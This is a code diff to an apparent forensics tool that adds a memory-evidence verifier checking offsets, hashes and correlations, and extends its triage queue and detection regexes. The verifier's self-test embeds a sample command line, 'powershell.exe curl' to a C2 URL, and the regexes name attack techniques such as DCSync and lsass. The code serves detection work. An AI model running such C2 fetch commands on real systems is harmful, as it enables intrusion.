+        net = (row.get("network") or {}).get("sourceOffset", (row.get("network") or {}).get("offset"))
+        distance = abs(cmd - net) if isinstance(cmd, int) and isinstance(net, int) else None
+        ok = bool(verified_offset(checks, "cmdlines", cmd) and verified_offset(checks, "network", net) and distance is not None and distance <= 512)
+        rows.append({"correlationType": "process-network", "cmdlineOffset": cmd, "networkOffset": net, "distance": distance, "verified": ok, "reason": "process-network-distance-verified" if ok else "missing-source-offset-verification"})
+    for row in (cor.get("credentialContext") or [])[:40]:
+        cred = (row.get("credential") or {}).get("sourceOffset", (row.get("credential") or {}).get("offset"))
+        cmd = (row.get("cmdline") or {}).get("sourceOffset", (row.get("cmdline") or {}).get("offset")) if row.get("cmdline") else None
+        net = (row.get("network") or {}).get("sourceOffset", (row.get("network") or {}).get("offset")) if row.get("network") else None
+        file_offset = (row.get("file") or {}).get("sourceOffset", (row.get("file") or {}).get("offset")) if row.get("file") else None
+        context = bool(verified_offset(checks, "cmdlines", cmd) or verified_offset(checks, "network", net) or verified_offset(checks, "files", file_offset))
+        ok = bool(verified_offset(checks, "credentials", cred) and context)
+        rows.append({"correlationType": "credential-context", "credentialOffset": cred, "cmdlineOffset": cmd, "networkOffset": net, "fileOffset": file_offset, "verified": ok, "reason": "credential-context-source-offsets-verified" if ok else "missing-credential-context-source-offset-verification"})
+    for row in (cor.get("timeline") or [])[:40]:
+        ts = (row.get("timestamp") or {}).get("sourceOffset", (row.get("timestamp") or {}).get("offset"))
+        cmd = (row.get("cmdline") or {}).get("sourceOffset", (row.get("cmdline") or {}).get("offset")) if row.get("cmdline") else None
+        net = (row.get("network") or {}).get("sourceOffset", (row.get("network") or {}).get("offset")) if row.get("network") else None
+        ok = bool(verified_offset(checks, "timestamps", ts) and (verified_offset(checks, "cmdlines", cmd) or verified_offset(checks, "network", net)))
+        rows.append({"correlationType": "timeline", "timestampOffset": ts, "cmdlineOffset": cmd, "networkOffset": net, "verified": ok, "reason": "timeline-source-offsets-verified" if ok else "missing-timeline-source-offset-verification"})
+    return rows
+
+
+def verify(memory_path, quicklook_path):
+    with open(memory_path, "rb") as handle:
+        data = handle.read()
+    with open(quicklook_path, "r", encoding="utf-8") as handle:
+        summary = json.load(handle)
+    image = {"size": len(data), "sha256": sha256(data), "verified": len(data) == summary.get("size") and sha256(data) == summary.get("sha256")}
+    if data:
+        mutated = bytearray(data)
+        mutated[0] ^= 0xFF
+        mutated_sha = sha256(bytes(mutated))
+        image["negativeControl"] = {"controlType": "memory-image-byte-mutation-rejection", "mutatedSha256": mutated_sha, "passed": mutated_sha != summary.get("sha256")}
+    signal_checks = verify_signal_rows(data, summary)
+    corr_checks = correlation_rows(summary, signal_checks)
+    controls = [image.get("negativeControl")] + [row.get("negativeControl") for row in signal_checks]
+    controls = [row for row in controls if row and row.get("passed")]
+    verified_signals = [row for row in signal_checks if row.get("verified")]
+    pn = [row for row in corr_checks if row.get("verified") and row.get("correlationType") == "process-network"]
+    cred = [row for row in corr_checks if row.get("verified") and row.get("correlationType") == "credential-context"]
+    timeline = [row for row in corr_checks if row.get("verified") and row.get("correlationType") == "timeline"]
+    blockers = []
+    if not image.get("verified"):
+        blockers.append("missing-memory-image-hash-verification")
+    if not verified_signals:
+        blockers.append("missing-memory-signal-offset-verification")
+    if (summary.get("correlations", {}).get("processNetwork") and not pn):
+        blockers.append("missing-memory-process-network-verification")
+    if (summary.get("correlations", {}).get("credentialContext") and not cred):
+        blockers.append("missing-memory-credential-context-verification")
+    if (summary.get("correlations", {}).get("timeline") and not timeline):
+        blockers.append("missing-memory-timeline-verification")
+    if not controls:
+        blockers.append("missing-memory-negative-control")
+    proof_ready = image.get("verified") and bool(verified_signals) and bool(controls) and (bool(cred) or bool(pn) or bool(timeline))
+    repair_queue = [{"id": "memory-evidence-verification-" + blocker, "blocker": blocker, "action": "Collect verifier-bound memory evidence and rerun memory-evidence-verifier.py.", "rerunCommand": "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json"} for blocker in blockers]
+    return {"kind": "repi-memory-evidence-verification", "schemaVersion": 1, "target": memory_path, "proofReady": proof_ready, "imageIdentity": image, "signalChecks": signal_checks, "correlationChecks": corr_checks, "negativeControls": controls, "stats": {"signalsVerified": len(verified_signals), "processNetworkVerified": len(pn), "credentialContextVerified": len(cred), "timelineVerified": len(timeline), "negativeControlsPassed": len(controls)}, "repairQueue": repair_queue, "promotionReport": {"proofReady": proof_ready, "blockers": blockers}}
+
+
+def self_test():
+    with tempfile.TemporaryDirectory() as tmp:
+        chunks = [b"Windows 10 Pro", b"powershell.exe curl http://10.0.0.5/c2", b"password=redacted", b"2026-07-01 10:20:30"]
+        data = b"\x00".join(chunks)
+        path = os.path.join(tmp, "mem.vmem")
+        with open(path, "wb") as handle:
+            handle.write(data)
+        def row(kind, value):
+            offset = data.index(value)
+            return {"text": value.decode(), "offset": offset, "sourceOffset": offset, "valueSha256": sha256(value), "valueLength": len(value)}
+        cmd = row("cmdlines", chunks[1])
+        net_value = b"http://10.0.0.5/c2"
+        net_offset = data.index(net_value)
+        net = {"text": net_value.decode(), "offset": net_offset, "sourceOffset": net_offset, "valueSha256": sha256(net_value), "valueLength": len(net_value)}
+        cred = row("credentials", chunks[2])
+        ts = row("timestamps", chunks[3])
+        summary = {"size": len(data), "sha256": sha256(data), "osGuess": "windows", "stringScan": {"signals": {"cmdlines": [cmd], "network": [net], "credentials": [cred], "timestamps": [ts]}}, "correlations": {"processNetwork": [{"cmdline": cmd, "network": net}], "credentialContext": [{"credential": cred, "cmdline": cmd, "network": net}], "timeline": [{"timestamp": ts, "cmdline": cmd, "network": net}]}}
+        quicklook = os.path.join(tmp, "memory-quicklook.json")
+        with open(quicklook, "w", encoding="utf-8") as handle:
+            json.dump(summary, handle)
+        result = verify(path, quicklook)
+        assert result["proofReady"], json.dumps(result, sort_keys=True)
+        print(json.dumps({"kind": "repi-memory-evidence-verifier-self-test", "status": "ok", "stats": result["stats"]}, sort_keys=True))
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Verify REPI memory quicklook signals and correlations against source bytes.")
+    parser.add_argument("memory", nargs="?")
+    parser.add_argument("quicklook", nargs="?", default="memory-quicklook.json")
+    parser.add_argument("output", nargs="?", default="memory-evidence-verification.json")
+    parser.add_argument("--self-test", action="store_true")
+    args = parser.parse_args()
+    if args.self_test:
+        self_test()
+        return 0
+    if not args.memory:
+        parser.error("memory is required unless --self-test is used")
+    result = verify(args.memory, args.quicklook)
+    with open(args.output, "w", encoding="utf-8") as handle:
+        json.dump(result, handle, indent=2, sort_keys=True)
+        handle.write("\n")
+    print(json.dumps({"kind": result["kind"], "proofReady": result["proofReady"], "stats": result["stats"], "output": args.output}, sort_keys=True))
+    return 0 if result["proofReady"] else 1
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`;
+}
+
 
 function memoryTriagePlanSource(target) {
 	return `#!/usr/bin/env bash
@@ -8749,7 +9290,8 @@ cat > "$OUT/next.txt" <<'EOF'
 1. Bind OS/profile from volatility output or memory-quicklook.json osHints.
 2. Build process tree + commandline timeline before carving credentials.
 3. Correlate network endpoints with process/cmdline evidence.
-4. Treat credential strings as leads until tied to process, path, registry hive, or network artifact.
+4. Rerun memory-evidence-verifier.py when present; require source offsets, hashes, correlation windows, and mutation controls before proof promotion.
+5. Treat credential strings as leads until tied to process, path, registry hive, or network artifact.
 EOF
 `;
 }
@@ -8757,8 +9299,10 @@ EOF
 function memoryQuicklookRows(target, artifactDir) {
 	try {
 		const summary = memoryQuicklookSummary(target);
-		const evidenceClaims = memoryEvidenceClaims(summary);
+		const evidenceVerification = memoryEvidenceVerificationSummary(target, summary);
+		const evidenceClaims = memoryEvidenceClaims(summary, evidenceVerification);
 		if (!noWrite && artifactDir) writePrivate(join(artifactDir, "memory-quicklook.json"), `${JSON.stringify(summary, null, 2)}\n`);
+		if (!noWrite && artifactDir) writePrivate(join(artifactDir, "memory-evidence-verification.json"), `${JSON.stringify(evidenceVerification, null, 2)}\n`);
 		if (!noWrite && artifactDir) writePrivate(join(artifactDir, "memory-evidence-claims.json"), `${JSON.stringify(evidenceClaims, null, 2)}\n`);
 		const rows = [
 			{
@@ -8774,6 +9318,18 @@ function memoryQuicklookRows(target, artifactDir) {
 				error: undefined,
 			},
 			{
+				id: "memory-evidence-verification",
+				command: "internal",
+				args: [redact(target)],
+				cwd: root,
+				exit: evidenceVerification.proofReady ? 0 : 1,
+				signal: null,
+				durationMs: 0,
+				stdout: `${JSON.stringify(evidenceVerification, null, 2)}\n`,
+				stderr: "",
+				error: evidenceVerification.proofReady ? undefined : "memory evidence verification blockers present",
+			},
+			{
 				id: "memory-evidence-claims",
 				command: "internal",
 				args: [redact(target)],
@@ -8787,6 +9343,20 @@ function memoryQuicklookRows(target, artifactDir) {
 			},
 		];
 		if (!noWrite && artifactDir) {
+			const verifierPath = join(artifactDir, "memory-evidence-verifier.py");
+			writePrivate(verifierPath, memoryEvidenceVerifierSource(), 0o700);
+			rows.push({
+				id: "memory-evidence-verifier-artifact",
+				command: "internal",
+				args: [redact(verifierPath)],
+				cwd: root,
+				exit: 0,
+				signal: null,
+				durationMs: 0,
+				stdout: `verifier=${redact(verifierPath)}\nrun=python3 ${redact(verifierPath)} ${redact(target)} ${redact(join(artifactDir, "memory-quicklook.json"))} ${redact(join(artifactDir, "memory-evidence-verification.json"))}\n`,
+				stderr: "",
+				error: undefined,
+			});
 			const planPath = join(artifactDir, "memory-triage-plan.sh");
 			writePrivate(planPath, memoryTriagePlanSource(target), 0o700);
 			rows.push({
@@ -17464,9 +18034,11 @@ function nextQueue(targetInfo, artifactDir, toolState) {
 	}
 	if (targetInfo.lane === "memory-forensics") {
 		if (!noWrite) q.push(`cat ${shellQuote(join(artifactDir, "memory-quicklook.json"))}`);
+		if (!noWrite && existsSync(join(artifactDir, "memory-evidence-verification.json"))) q.push(`cat ${shellQuote(join(artifactDir, "memory-evidence-verification.json"))}`);
 		if (!noWrite && existsSync(join(artifactDir, "memory-evidence-claims.json"))) q.push(`cat ${shellQuote(join(artifactDir, "memory-evidence-claims.json"))}`);
+		if (!noWrite && existsSync(join(artifactDir, "memory-evidence-verifier.py"))) q.push(`python3 ${shellQuote(join(artifactDir, "memory-evidence-verifier.py"))} ${quotedTarget} ${shellQuote(join(artifactDir, "memory-quicklook.json"))} ${shellQuote(join(artifactDir, "memory-evidence-verification.json"))}`);
 		if (!noWrite) q.push(`bash ${shellQuote(join(artifactDir, "memory-triage-plan.sh"))} ${quotedTarget}`);
-		q.push(`repi -p ${shellQuote(`Continue memory forensics from ${artifactDir}: use memory-quicklook.json correlations plus memory-evidence-claims.json claimLedger to identify profile, rank process/cmdline/network/credential artifacts, carve IOC evidence, and produce timeline verification.`)}`);
+		q.push(`repi -p ${shellQuote(`Continue memory forensics from ${artifactDir}: use memory-quicklook.json correlations plus memory-evidence-verification.json and memory-evidence-claims.json claimLedger/composedPaths/repairQueue to identify profile, rank process/cmdline/network/credential artifacts, rerun memory-evidence-verifier.py for offset/hash/correlation/negative-control proof, carve IOC evidence, and produce timeline verification.`)}`);
 	}
 	if (targetInfo.lane === "windows-ad") {
 		if (!noWrite) q.push(`cat ${shellQuote(join(artifactDir, "windows-ad-quicklook.json"))}`);
@@ -17598,8 +18170,9 @@ function summarizeEvidence(rows, targetInfo, toolState) {
 		if (/repi-web-object-matrix|web-object|bolaSignal|path-number|query-number/i.test(text) && targetInfo.kind === "url") anchors.push("object authorization anchors");
 		if (/repi-web-replay-matrix|web-replay|responseSha256/i.test(text) && targetInfo.kind === "url") anchors.push("HTTP replay matrix anchors");
 		if (/volatility|windows\.info|linux\.banners|process|cmdline|lsass|netscan/i.test(text) && targetInfo.lane === "memory-forensics") anchors.push("memory forensic anchors");
-		if (/repi-memory-quicklook|memory-quicklook|memory-evidence-claims|memory-triage-plan|credential-string-signal|network-artifact-signal|suspicious-commandline-signal/i.test(text) && targetInfo.lane === "memory-forensics") anchors.push("memory quicklook anchors");
-		if (/process-network-correlation-signal|credential-context-correlation-signal|timeline-correlation-signal|processNetwork|credentialContext|memory-credential-network-pivot|claimLedger/i.test(text) && targetInfo.lane === "memory-forensics") anchors.push("memory correlation anchors");
+		if (/repi-memory-quicklook|memory-quicklook|memory-evidence-verification|memory-evidence-verifier|memory-evidence-claims|memory-triage-plan|credential-string-signal|network-artifact-signal|suspicious-commandline-signal/i.test(text) && targetInfo.lane === "memory-forensics") anchors.push("memory quicklook anchors");
+		if (/process-network-correlation-signal|credential-context-correlation-signal|timeline-correlation-signal|processNetwork|credentialContext|memory-credential-network-pivot|memory-forensic-proof-path|claimLedger/i.test(text) && targetInfo.lane === "memory-forensics") anchors.push("memory correlation anchors");
+		if (/memory-evidence-verification|memory-evidence-verifier|memory-signal-offset-verification-proof|memory-process-network-verification-proof|memory-credential-context-verification-proof|memory-verifier-negative-control-proof|memory-signal-offset-hash-match/i.test(text) && targetInfo.lane === "memory-forensics") anchors.push("memory verifier proof anchors");
 		if (/repi-windows-ad-quicklook|windows-ad-quicklook|windows-ad-triage|krbtgt|Kerberoast|DCSync|ADCS|Certipy|BloodHound|4769|4624/i.test(text) && targetInfo.lane === "windows-ad") anchors.push("Windows/AD identity anchors");
 		if (/bloodhound-graph-data-present|bloodhound-privilege-edge-signal|bloodhound-owned-principal-signal|bloodhound-owned-to-high-value-path|relationCounts|privilegeEdges|highValue|attackPaths|windows-ad-attack-path|windows-ad-credential-graph-pivot|windows-ad-adcs-graph-pivot|claimLedger|composedPaths|repairQueue/i.test(text) && targetInfo.lane === "windows-ad") anchors.push("BloodHound graph anchors");
 		if (/repi-malware-quicklook|malware-quicklook|malware-behavior-claims|malware-config-verification|malware-config-verifier|malware-triage|malware-behavior-chain|malware-ioc-config-proof-path|claimLedger|configFields|network-ioc-signal|CreateRemoteThread|VirtualAlloc|FLOSS|YARA|capa|ATT&CK|mutex|User-Agent/i.test(text) && targetInfo.lane === "malware") anchors.push("malware IOC/capability anchors");
